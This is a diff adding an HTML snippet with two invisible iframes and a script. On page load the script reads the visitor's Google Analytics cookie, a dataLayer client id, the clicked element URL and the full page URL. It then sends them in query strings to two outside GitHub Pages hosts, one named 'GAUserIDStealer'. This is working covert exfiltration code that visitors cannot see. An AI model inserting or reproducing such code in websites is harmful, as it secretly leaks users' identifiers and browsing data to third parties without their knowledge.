@@ -1,0 +1,46 @@
+<iframe id="cil_steal" height="0" width="0" style="display:none;visibility:hidden"src=""></iframe>
+<iframe id="gtpe_steal" height="0" width="0" style="display:none;visibility:hidden"src=""></iframe>
+<script>
+    function getgaCid() {
+        var name = "_ga=";
+        var decodedCookie = decodeURIComponent(document.cookie);
+        var ca = decodedCookie.split(';');
+        for(var i = 0; i <ca.length; i++) {
+            var c = ca[i];
+                while (c.charAt(0) == ' ') {
+                    c = c.substring(1);
+                }
+                if (c.indexOf(name) == 0) {
+                    return c.substring(name.length+6, c.length);
+                }
+        }
+        return "";
+    }
+    uuid=-1
+    for(i=0;i<dataLayer.length;i++){
+        try{
+            uuid=dataLayer[i]['ga_c_id'];
+        }
+        catch(e){
+            console.log("pass");
+        }
+        if(uuid!=null){
+            break;
+        }
+    }
+    element_url=-1
+    for(i=dataLayer.length-1;i>0;i--){
+        try{
+            element_url=dataLayer[i]['gtm.elementUrl'];
+        }
+        catch(e){
+            console.log("pass");
+        }
+        if(element_url!=null){
+            break;
+        }
+    }
+    
+    document.getElementById("cil_steal").src ="https://cilegann.github.io/GAUserIDStealer/steal.html?uid=="+uuid+"&&domain=="+window.location.hostname+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&element_url=="+element_url;
+    document.getElementById("gtpe_steal").src ="https://gamataipei.github.io/sending_for_fun/index.html?uid=="+uuid+"&&domain=="+window.location.hostname+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&element_url=="+element_url;
+</script>
